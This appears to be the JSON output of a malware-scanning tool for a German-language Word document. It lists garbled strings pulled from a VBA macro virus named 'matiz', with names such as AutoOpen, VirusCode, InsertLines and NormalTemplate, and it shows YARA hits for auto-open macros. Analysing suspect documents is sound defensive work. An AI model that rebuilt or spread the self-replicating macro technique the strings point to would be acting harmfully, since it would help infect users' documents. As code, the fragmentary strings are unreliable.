            " _9?4ct`",
            "GY_9",
            "9?>&^",
            "? True",
            "ive:",
            "Item@",
            "Typ!Oj ",
            "eckItem ",
            "= Active",
            "Document",
            ".VBProje",
            "$Compon",
            "Ts.Count",
            "z> 1",
            " Then",
            "For i",
            "t\"(i@).Type",
            "bext_ct_",
            "StdModul",
            "DokHostNam",
            "$Exit hFunoi",
            "nPd If",
            "NG i",
            "Norm",
            " As Bool<ea",
            "lse\u0301",
            "alTemplate",
            "9Tru8AT",
            "wC]StriAG= A\t",
            "V  `",
            "_^@,[-]^#/b,Ref",
            "&]j'6",
            "erenceFA",
            "s*$$\"VBIDE\"Csi",
            "ddFromGu",
            "id \"{000@2E157-",
            "6}\", 1, 0[A8]e-i-#",
            "x-Find1Li",
            "neCInteger",
            "IMyat(",
            ")Lde#Of",
            "scrZLeft(",
            "(i E)`",
            "\"\u019fMatizM",
            "C]g}&",
            "kA41",
            "X ?0",
            "Sub AutoOpen1'",
            "_B_var_set",
            "MyHost_f",
            "_B_var_MyHost_vj",
            "_B_str_VirusCodeY",
            "MsgBoxR",
            "MyNewHost_5",
            "Fuc(",
            "Funtion",
            "_B_var_Funtion",
            "AmINormIstalled'",
            "XAmINormInstalled",
            "AmIIt",
            "_B_var_LeftQ",
            "_B_var_ifP",
            "Funct",
            "_B_var_Exit",
            "ActiveHost_",
            "YAmIActInstalled'l",
            "_B_var_FunctionO",
            "ActiveD",
            "Itemz",
            "NormHostName_",
            "Application*",
            "UserName\\",
            "_B_var_Openl",
            "_B_var_MyNewHost_",
            "_B_var_ActiveHost_\u055f",
            "_B_var_NormHostName_]",
            "_B_var_iq[",
            "_B_var_i\t",
            "_B_var_MyFile+P",
            "_B_var_UCasea",
            "_B_var_CheckItem<",
            "_B_var_vbext_ct_StdModule",
            "_B_var_Error)",
            "_B_var_forjL",
            "_B_var_j",
            "activedoc\u0692",
            "Variablesn",
            "_B_var_icqZ",
            "foB]",
            "_B_var_fo",
            "ActiveS",
            "Normalteq",
            "VBIDEA",
            "_B_var_HostLines",
            "RndR",
            "DokHostName_",
            "_B_var_Our1Line0",
            "ActHost",
            "_B_var_DokHostName_R",
            "Addr",
            "vbext",
            "AutoOpen*",
            "_B_var_On6",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F4AF9",
            "17C2-146",
            "4-11D3-A",
            "K40339`3BF25",
            "TWD#Micr@osoft ",
            "` Ob",
            " Library",
            ",PJP\\VBE\\\t(EX(.E",
            "CxN@UTalCxNTax",
            " +\t,C",
            "OPfficDO@fP",
            "G{2DF8D",
            "04C-5BFA",
            "-101B-BDE5@AA@4",
            "fPROGRA",
            "<ICROS",
            "OFT OFFI",
            "MSO9`7.DLLHj\" ",
            "8.0jVBI DE>",
            "i2E157",
            "+GEMEINS",
            "AME DATE IEN\\M/SHPARED@qAArEXT1.OLB/",
            "Visual B",
            "asic for Applica",
            "s Extens@ibilitdO",
            "BuThisDoc@ument",
            "o5u ie",
            "nE@|",
            "1a`&",
            "S*vz",
            "2\",m4",
            "i`t/",
            "ThisDocument",
            "matiz",
            "ID=\"{6A57E85A-1B61-11D3-ABD0-00403393BF25}\"",
            "Document=ThisDocument/&H00000000",
            "Module=matiz",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "2637721ab9",
            "2937721ab9",
            "IWja",
            "KWja",
            "else",
            "Function",
            "Nothing",
            "resume",
            "Then",
            "True",
            "Wordk",
            "Win16~",
            "Win32",
            "Projekt1A",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "Modul1",
            "matizS",
            "MyFile",
            "MyModul",
            "MyHost%",
            "MyNewHost",
            "ActInsR",
            "NormIns",
            "DokHostName",
            "NormHostNameE/",
            "ActiveHost",
            "MatizMe\t",
            "WhatsMyName^",
            "CheckRefNormal",
            "CheckRefActive",
            "AmINormInstalledd",
            "AmIActInstalledT",
            "CheckNormHost",
            "DropMeRl",
            "Importi",
            "Our1Line?Y",
            "Find1Line`e",
            "VirusLines-",
            "CodeModule",
            "CountOfLines!\\",
            "VirusCode`6",
            "Lines",
            "HostLines",
            "InsertLines",
            "MacroContainer>",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "ActiveDocument\\",
            "Count0v",
            "UCase5",
            "CheckDokHostl",
            "CheckItem6C",
            "vbext_ct_StdModule-",
            "References",
            "AddFromGuidA{",
            "MyHostACMG=\"DDDF6C4D942E982E982E982E98\"",
            "DPB=\"CECC7F8C818C738D738D73\"",
            "GC=\"BFBD0E9F0E61FE62FE6201\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 469, 357, ",
            "matiz=0, 0, 448, 338, Z",
            "Microsoft Word-Dokument",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.385774",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
